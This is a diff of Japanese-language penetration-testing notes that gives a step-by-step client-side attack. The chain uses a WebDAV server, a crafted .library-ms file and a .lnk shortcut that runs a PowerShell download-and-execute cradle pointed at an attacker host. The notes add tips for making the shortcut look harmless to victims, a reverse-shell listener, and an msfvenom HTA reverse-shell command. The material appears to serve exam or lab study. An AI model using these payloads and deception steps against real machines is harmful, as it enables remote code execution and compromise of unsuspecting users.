@@ -404,7 +404,7 @@ End Sub
 
 ## .library-ms ＋ WebDAV ＋ .lnk によるReverse Shell実行手順
 
-### 🔹 第1段階：WebDAV サーバの準備
+### 第1段階：WebDAV サーバの準備
 
 0. wsgidavインストール（必要に応じて）
 ```zsh
@@ -433,7 +433,7 @@ wsgidav --host=0.0.0.0 --port=80 --root=~/Webdav --auth=anonymous
 
 $$WebDavサーバ構築成功時の出力$$
 
-### 🔹 第2段階：ライブラリファイル(.library-ms)の作成
+### 第2段階：ライブラリファイル(.library-ms)の作成
 
 3. Windowsマシン（VMを開くか、RDPで接続）で、VSCode、なければメモ帳を開く
 	- ※Windowsマシン上で構築することで、ライブラリファイルや.ショートカットファイルの構築・テストが非常に楽になる
@@ -525,6 +525,7 @@ $$実行後のライブラリファイルの中身が変わっている$$
 	- `imageres.dll`：リソースが格納されたシステム用DLL
 		- パス：C:\Windows\System32\imageres.dll
 	- 1002：ドキュメントのアイコンを指すリソースID（1003：ピクチャのアイコン）
+
  ![](../画像ファイル/Pasted%20image%2020250518151605.png)
 
 4. ライブラリファイルがWindowsエクスプローラー上で開かれたときにどのようなカラム構成（以下画像赤枠）になるかを指定する
@@ -570,7 +571,7 @@ $$実行後のライブラリファイルの中身が変わっている$$
 | `<name>Documents</name>` のように直接書く                       | ・OSの言語が英語以外（日本語など）の場合に対応できない  <br>・翻訳作業が必要になる  <br>・一貫性がなくなる |
 | `<name>@windows.storage.dll,-34582</name>` のようにDLLを参照する | ✅ OSが自動で言語に合わせて表示  <br>✅ Windows標準ライブラリと同じ形式で自然に見える          |
 
-### 🔹 第3段階：.lnkファイルの準備
+### 第3段階：.lnkファイルの準備
 
 目的：ターゲットが実行できるリバースシェルペイロードを.lnkショートカットファイルに作成すること
 
@@ -584,7 +585,9 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[
 
 ![](../画像ファイル/Pasted%20image%2020250519074203.png)
 
+
 $$ショートカット作成中の画面$$
+
 #### 💡Tips：ショートカットファイルを無害に見せる方法
 
 - ターゲットがショートカットのプロパティを閲覧し、ショートカットのリンク先を確認してエクスプロイトコードに気付くことがある
@@ -594,7 +597,7 @@ $$ショートカット作成中の画面$$
 
 ![ 350](../画像ファイル/Pasted%20image%2020250519075106.png)
 
-### 🔹 第4段階：リバースシェルの受信
+### 第4段階：リバースシェルの受信
 
 9. リバースシェルリスナーを起動しておく
 ```zsh
@@ -612,7 +615,7 @@ sudo python -m http.server <Port>
 
 11. テストのため、ショートカットファイルをダブルクリックし、正常にリバースシェルを受信できるか確認する
 
-### 🔹 第5段階：配布と実行
+### 第5段階：配布と実行
 
 12. Windowsマシン上で作成したショートカット(.lnk)を、攻撃者マシンの`webdav`ディレクトリに配置する
 	- [ファイル操作、ユーティリティ](../Cheatsheet/Common/ファイル操作、ユーティリティ.md#scp)
@@ -643,7 +646,7 @@ sudo python -m http.server <Port>
 
 #### 補足：.lnkへMotWが付与されてしまう
 
-- ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある：[Module 12：Client-side Attacks](#MotWとは)
+- ライブラリファイル上でショートカット(.lnk)を実行すると、MotWが付与され、攻撃が阻害される可能性がある
 
 ![](../画像ファイル/Pasted%20image%2020250520075229.png)
 
@@ -652,12 +655,15 @@ $$.lnk実行時の警告ポップアップ$$
 ---
 ---
 
-# FYI：HTAペイロード作成
+# 補足事項
 
-- マクロの代わりに使える
-- msfvenom：
+## HTAペイロード
+
+- マクロの代わりに使えるペイロード
+
+msfvenom
 ```zsh
-msfvenom -p windows/shell_reverse_tcp -f hta-psh -o derp.hta lport=443 lhost=tun0
+msfvenom -p windows/shell_reverse_tcp -f hta-psh -o shell.hta LPORT=443 LHOST=<attacker_IP>
 ```
 
 - コードスニペット
